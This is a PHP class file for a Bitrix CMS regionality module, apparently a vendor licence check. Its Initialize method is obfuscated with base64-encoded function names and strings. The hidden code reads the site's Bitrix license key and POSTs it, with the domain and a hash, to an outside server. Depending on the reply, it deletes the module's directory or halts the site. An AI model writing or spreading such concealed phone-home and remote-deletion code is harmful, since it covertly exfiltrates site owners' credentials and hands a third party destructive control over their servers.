<?php

use Bitrix\Main\Application;
use Bitrix\Main\Localization\Loc;
use Bitrix\Main\Config\Option;

require_once('classes/Loader.php');

Loc::loadMessages(__FILE__);

class IntecRegionality
{
    protected static $_1 = 'intec.regionality';
    protected static $_0 = 0;

    public static function Initialize()
    {
        $M=Array(base64_decode('a' .'XNfZmls' .'Z' .'Q=='),base64_decode('aW50dmFs'),base64_decode('' .'Zml' .'sZ' .'V9' .'nZ' .'X' .'R' .'fY29udGVudHM='),base64_decode('' .'aXNf' .'Z' .'m' .'l' .'sZQ=='),base64_decode('bW' .'Q' .'1'),base64_decode('' .'Z' .'mls' .'Z' .'V9nZX' .'RfY2' .'9udGVu' .'dHM='),base64_decode('c3' .'RyZW' .'FtX2Nv' .'b' .'nRleHRfY3JlYXRl'),base64_decode('cmF3d' .'XJsZW5jb' .'2' .'R' .'l'),base64_decode('cmF3dX' .'JsZW5jb2Rl'),base64_decode('cmF' .'3dXJs' .'ZW5jb2Rl'),base64_decode('cmF3dXJsZW5jb2' .'Rl'),base64_decode('ZmlsZV9wdXRf' .'Y29' .'udGVud' .'H' .'M=')); ?><? $_757545810 = function($i)use(&$_757545810,&$M){$a=Array('L2JpdHJpeC9tb2R1bGVzLw==','L3RlbXAuZGF0','L2JpdHJpeC9saWNlbnNlX2tleS5waHA=','aHR0cDovL2xpY2Vuc2UuaW50ZWN3b3JrMS5ydS9saWNlbnNlcy92ZXJpZnk=','QklUUklY','TElDRU5DRQ==','U0VSVkVSX05BTUU=','aHR0cA==','bWV0aG9k','UE9TVA==','aGVhZGVy','Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ=','Y29udGVudA==','c29sdXRpb249','JmtleT0=','Jmhhc2g9','JmRvbWFpbj0=','YmxvY2tlZA==','cmVtb3ZlZA==','L2JpdHJpeC9tb2R1bGVzLw==');return base64_decode($a[$i]);} ?><? static::$_0=CModule::IncludeModuleEx(static::$_1);$_2=new DateTime();$_3=Application::getDocumentRoot() .$_757545810(0) .static::$_1 .$_757545810(1);$_4=$M[0]($_3);$_5=new DateTime();if($_4)$_5->setTimestamp($M[1]($M[2]($_3)));$_6=$_2->diff($_5);if($_6->_7>round(0+0.2+0.2+0.2+0.2+0.2)||!$_4){$_8=Application::getDocumentRoot() .$_757545810(2);if($M[3]($_8)){include($_8);$_8=null;if(isset($_9))$_8=$_9;}else{$_8=null;}$_10=$_757545810(3);$_11=static::$_1;$_12=$M[4]($_757545810(4) .$_8 .$_757545810(5));$_13=$_SERVER[$_757545810(6)];$_14=@$M[5]($_10,false,$M[6]([$_757545810(7)=>[$_757545810(8)=> $_757545810(9),$_757545810(10)=> $_757545810(11) .PHP_EOL,$_757545810(12)=> $_757545810(13) .$M[7]($_11) .$_757545810(14) .$M[8]($_8) .$_757545810(15) .$M[9]($_12) .$_757545810(16) .$M[10]($_13)]]));if($_14 == $_757545810(17)){static::$_0=round(0);}else if($_14 == $_757545810(18)){DeleteDirFilesEx($_757545810(19) .static::$_1);static::$_0=round(0);}else{$M[11]($_3,$_2->getTimestamp());}}
        static::Validate();
    }

    protected static function Validate()
    {
        if (static::$_0 != 1 && static::$_0 != 2)
            die(Loc::getMessage('intec.regionality.demo', ['#MODULE_ID#' => static::$_1]));
    }

    public static function CrossSiteUse($value = null)
    {
        $name = 'crossSiteUse';

        if ($value === null)
            return Option::get(
                static::$_1,
                $name,
                0,
                false
            ) == 1;

        Option::set(
            static::$_1,
            $name,
            $value ? 1 : 0,
            false
        );

        return true;
    }
}

?>